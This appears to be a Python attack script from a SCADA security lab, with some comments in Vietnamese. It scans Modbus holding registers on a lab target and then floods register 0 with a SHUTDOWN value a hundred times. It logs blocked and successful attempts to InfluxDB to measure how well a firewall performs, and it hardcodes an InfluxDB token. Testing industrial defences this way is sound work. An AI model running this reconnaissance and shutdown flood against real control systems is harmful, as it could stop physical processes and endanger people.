#!/usr/bin/env python3
"""
Modbus Attacker - Secure Phase Testing
Tracks blocked connections and reports security metrics
"""

import os
import time
import socket
from pymodbus.client import ModbusTcpClient
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

TARGET_HOST = os.environ.get("TARGET_HOST", "modbus-server")
INFLUX_URL = os.environ.get("INFLUXDB_URL", "http://influxdb:8086")
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)

stats = {
    "total_attempts": 0,
    "successful": 0,
    "blocked": 0,
    "connection_failures": 0,
    "recon_success": 0,
    "recon_blocked": 0,
    "write_success": 0,
    "write_blocked": 0,
}


def push_metric(action, field_name, value):
    """Push metric to InfluxDB"""
    try:
        if field_name == "latency":
            field_value = float(value)
        else:
            field_value = int(value)
        point = (
            Point("modbus")
            .tag("container", "modbus-attacker")
            .tag("action", action)
            .tag("phase", "secure")
            .field(field_name, field_value)
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


def push_stats():
    """Push aggregated attack statistics"""
    try:
        block_rate = 0
        if stats["total_attempts"] > 0:
            block_rate = (stats["blocked"] / stats["total_attempts"]) * 100
        
        point = (
            Point("attack_stats")
            .tag("container", "modbus-attacker")
            .tag("protocol", "modbus")
            .tag("phase", "secure")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("block_rate", block_rate)
            .field("connection_failures", stats["connection_failures"])
            .field("recon_success", stats["recon_success"])
            .field("recon_blocked", stats["recon_blocked"])
            .field("write_success", stats["write_success"])
            .field("write_blocked", stats["write_blocked"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
        print(f"[STATS] Attempts: {stats['total_attempts']}, Blocked: {stats['blocked']}, Rate: {block_rate:.1f}%")
    except Exception as e:
        print(f"Stats push error: {e}")


def run_modbus_attacker():
    print("=" * 60)
    print("  MODBUS ATTACKER - SECURE PHASE TESTING")
    print("=" * 60)
    
    while True:
        print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG (SECURE MODE) ---")
        
        print(f"[TARGET] {TARGET_HOST}:502")
        client = ModbusTcpClient(TARGET_HOST, port=502, timeout=5)
        
        try:
            start_connect = time.time()
            connected = client.connect()
            connect_time = (time.time() - start_connect) * 1000
            
            if not connected:
                stats["connection_failures"] += 1
                stats["blocked"] += 1
                stats["total_attempts"] += 1
                print(f"[BLOCKED] Kết nối bị chặn! (Connection refused)")
                push_metric("blocked", "blocked", 1)
                push_stats()
                time.sleep(30)
                continue
                
            print(f"[OK] Kết nối thành công trong {connect_time:.2f}ms")
            
            # [Phase 1]: Reconnaissance - Quét thanh ghi
            print("\n[PHASE 1] Quét 100 thanh ghi Holding Registers...")
            stats["total_attempts"] += 1
            
            start_time = time.time()
            try:
                result = client.read_holding_registers(address=0, count=99, slave=1)
                latency = (time.time() - start_time) * 1000
                
                if result.isError():
                    stats["recon_blocked"] += 1
                    stats["blocked"] += 1
                    print(f"[BLOCKED] Recon bị chặn: {result}")
                    push_metric("recon_blocked", "blocked", 1)
                else:
                    stats["recon_success"] += 1
                    stats["successful"] += 1
                    print(f"[OK] Quét thành công {len(result.registers)} thanh ghi trong {latency:.2f}ms")
                    push_metric("attack_recon", "register_value", len(result.registers))
                    push_metric("attack_recon", "latency", latency)
            except Exception as e:
                stats["recon_blocked"] += 1
                stats["blocked"] += 1
                print(f"[BLOCKED] Recon exception: {e}")
                push_metric("recon_blocked", "blocked", 1)
            
            time.sleep(2)
            
            # [Phase 2]: DoS Attack - Ghi lệnh SHUTDOWN
            print("\n[PHASE 2] Tấn công DoS: Ghi lệnh SHUTDOWN (99) x 100 lần...")
            success_count = 0
            blocked_count = 0
            
            for i in range(100):
                stats["total_attempts"] += 1
                try:
                    start_time = time.time()
                    res = client.write_register(0, 99, slave=1)
                    latency = (time.time() - start_time) * 1000
                    
                    if res.isError():
                        blocked_count += 1
                        stats["write_blocked"] += 1
                        stats["blocked"] += 1
                        push_metric("write_blocked", "blocked", 1)
                    else:
                        success_count += 1
                        stats["write_success"] += 1
                        stats["successful"] += 1
                        push_metric("write", "latency", latency)
                        push_metric("write", "register_value", 99)
                    
                    time.sleep(0.05)
                except Exception as e:
                    blocked_count += 1
                    stats["write_blocked"] += 1
                    stats["blocked"] += 1
                    push_metric("write_blocked", "blocked", 1)
            
            print(f"[RESULT] Ghi thành công: {success_count}/100, Bị chặn: {blocked_count}/100")
            
            push_stats()
            client.close()
            
        except socket.timeout:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            stats["total_attempts"] += 1
            print(f"[BLOCKED] Connection timeout - Firewall blocking!")
            push_metric("blocked", "blocked", 1)
            
        except ConnectionRefusedError:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            stats["total_attempts"] += 1
            print(f"[BLOCKED] Connection refused - Firewall blocking!")
            push_metric("blocked", "blocked", 1)
            
        except Exception as e:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            stats["total_attempts"] += 1
            print(f"[ERROR] {e}")
            push_metric("error", "blocked", 1)
        
        push_secure_stats()
        print("\n--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---")
        time.sleep(30)


def push_secure_stats():
    """Push stats with secure_attack measurement for firewall monitor"""
    try:
        point = (
            Point("secure_attack")
            .tag("container", "modbus-attacker")
            .tag("protocol", "modbus")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("connection_failures", stats["connection_failures"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"secure_attack push error: {e}")


if __name__ == "__main__":
    run_modbus_attacker()
